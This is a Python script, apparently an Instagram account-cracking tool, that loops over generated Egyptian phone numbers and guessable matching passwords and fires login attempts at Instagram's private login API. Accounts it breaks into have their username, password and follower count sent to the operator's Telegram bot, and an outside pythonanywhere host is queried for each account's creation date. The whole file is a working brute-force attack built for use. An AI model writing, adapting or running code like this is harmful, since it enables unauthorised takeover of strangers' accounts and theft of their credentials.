try:
	import os, time
	import user_agent, json, random
	import sys, requests, secrets, pyfiglet
	from time import sleep
	from os import system
except ImportError:
    os.system('pip install time')
    os.system('pip install random')
    os.system('pip install requests')
    os.system('pip install user_agent')
    os.system('pip install json')
    os.system('pip install secrets')
    os.system('pip install sys')
    os('clear')
else:
	import os, time
	import user_agent, json, random
	import sys, requests, secrets, pyfiglet
	from time import sleep
	from os import system

aa = 0
zz = 0
E = '\x1b[1;31m'#احمر
G = '\x1b[1;32m'#اخضر
S = '\x1b[1;33m'#اصفر
Z = '\x1b[1;31m'#احمر
X = '\x1b[1;33m'#اصفر
Z1 = '\x1b[2;31m'#احمر باهت
F = '\x1b[2;32m'#اخضر
A = '\x1b[2;39m'#ابيض
C = '\x1b[2;35m'#بمبي
B = '\x1b[2;36m'#سماوي
Y = '\x1b[1;34m'#بنفسجي
Welcom = pyfiglet .figlet_format ("Welcom")
Wrong = pyfiglet .figlet_format ("Wrong")

option = int(input(E+'Inter The pass : '))
if option == 66:
	print(G+Welcom)
	sleep(1.2)
	system('clear')
else:
   print(E+Wrong)
   exit()
print(E+"  ____ _                           _____                     / ___| | _____      ___ __  ___  |_   _|__  __ _ _ __ ___  | |   | |/ _ \ \ /\ / / '_ \/ __|   | |/ _ \/ _` | '_ ` _ \ | |___| | (_) \ V  V /| | | \__ \   | |  __/ (_| | | | | | | \____|_|\___/ \_/\_/ |_| |_|___/   |_|\___|\__,_|_| |_| |_|")
print("  ")
print("========================================")

id = input(X+"Inter Your Telegram ID : " + G)
print("    ")
Tok = input (X+"Inter Your Bot Token : " + G)
start_msg = requests.post(f"https://api.telegram.org/bot{Tok}/sendMessage?chat_id={id}&text=Just Wait And B Cool When I HunT Any Acc I Will Send It Here | dev:@T_C66bot").json()

def code_joo(userQ, password):
        cookie = secrets.token_hex(8) * 2
        head = {'HOST':'www.instagram.com', 
         'KeepAlive':'True', 
         'user-agent':'Mozilla/5.0 (X11; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Safari/537.36', 
         'Cookie':cookie, 
         'Accept':'*/*', 
         'ContentType':'application/x-www-form-urlencoded', 
         'X-Requested-With':'XMLHttpRequest', 
         'X-IG-App-ID':'936619743392459', 
         'X-Instagram-AJAX':'missing', 
         'X-CSRFToken':'missing', 
         'Accept-Language':'en-US,en;q=0.9'}
        url_id = f"https://www.instagram.com/{userQ}/?__a=1"
        req_id = requests.get(url_id, headers=head).json()
        name = str(req_id['graphql']['user']['full_name'])
        id = str(req_id['graphql']['user']['id'])
        followes = str(req_id['graphql']['user']['edge_followed_by']['count'])
        following = str(req_id['graphql']['user']['edge_follow']['count'])
        re = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
        ree = re.json()
        dat = ree['data']
        joo3 = f"I have Told You And This Is The Acc  \n UsEr Or EmAiL : {username}\n                     PaSS : {password}\n                        FoLLoWeS : {followes}\n               TiMe : {dat}\n                                   My Tele User : @T_C66\n"
        tlg = f"https://api.telegram.org/bot{Tok}/sendMessage?chat_id={id}&text=\n {joo3} \n"
        i = requests.post(tlg)
        print(G + joo3)
        
        
url = 'https://i.instagram.com/api/v1/accounts/login/'
headers = {'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
sleep(1.1)
sleep(0.1)
user = '0987654321'
while True:
        us = str(''.join((random.choice(user) for i in range(6))))
        username = '+201289' + us
        password = '01289'+ us
        from uuid import uuid4
        uid = str(uuid4())
        data = {'uuid':uid, 
         'password':password, 
         'username':username,
         'device_id':uid, 
         'from_reg':'false', 
         '_csrftoken':'missing', 
         'login_attempt_countn':'0'}
        req = requests.post(url, headers=headers, data=data)
        if 'logged_in_user' in req.json():
            zz += 1
            userQ = req.json()['logged_in_user']['username']
            code_joo(userQ, password)
        elif '"message":"challenge_required","challenge"' in req.json():
            os.system('cls' if os.name == 'nt' else 'clear')
            print(Z1+f"\r                 \n [=] Hit : {zz} \n [=] Bad : {aa} \n [=] Scure :  \n [=] Block : \n [=] User : {username} \n [=] Pass : {password} ",end='')
        else:
            os.system('cls' if os.name == 'nt' else 'clear')
            print(C+f"\r                 \n {F}[=] Hit : {zz} \n {Z1}[=] Bad : {aa} {S}\n{A} [=] Scure :  \n {X}[=] Block : \n {C}[=] User : {username} \n{Z} [=] Pass : {password} ",end='')
            aa += 1
